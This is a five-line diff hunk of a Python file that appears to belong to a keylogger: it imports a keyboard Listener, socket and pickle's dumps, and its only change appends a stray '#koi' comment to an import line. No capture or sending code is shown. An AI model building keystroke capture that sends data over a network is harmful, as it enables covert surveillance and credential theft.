@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener#koi
 import socket
 from pickle import dumps
 Header = 10
